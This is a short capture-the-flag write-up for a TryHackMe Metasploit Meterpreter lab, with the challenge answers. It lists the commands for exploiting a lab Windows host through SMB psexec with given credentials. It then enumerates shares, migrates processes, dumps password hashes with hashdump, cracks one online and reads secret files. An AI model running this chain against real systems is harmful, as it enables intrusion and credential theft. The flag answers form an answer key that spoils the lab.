# THM - Metasploit: Meterpreter

<br>

## Task 5

```shell
mkdir nmap
nmap -A -oN nmap/initial -p- 10.10.38.146

msfconsole
	use exploit/windows/smb/psexec
		show options
		set RHOSTS 10.10.38.146
		set LHOST 10.14.27.197
		set SMBUser ballen
		set SMBPass Password1
		run
```

### Task 5.1

```shell
			sysinfo
```

> ACME-TEST

### Task 5.2

> FLASH

### Task 5.3

```shell
			^Z
			y
		sessions
		back
		
	use post/windows/gather/enum_shares
		show options
		set SESSION 1
		run
```

> speedster

### Task 5.4

```shell
		sessions -i 1
			getpid
			ps
			migrate 772
			hashdump
```

> 69596c7aa1e8daee17f8e78870e25a5c

### Task 5.5

🧰 https://crackstation.net/

> Trustno1

### Task 5.6

```shell
			search -f secrets.txt
```

> c:\Program Files (x86)\Windows Multimedia Platform\

### Task 5.7

```shell
			cat "c:\Program Files (x86)\Windows Multimedia Platform\secrets.txt"
```

> KDSvbsw3849

### Task 5.8

```shell
			search -f realsecret.txt
```

> c:\inetpub\wwwroot\

### Task 5.9

```shell
			cat "c:\inetpub\wwwroot\realsecret.txt"
```

> The Flash is the fastest man alive

<br>

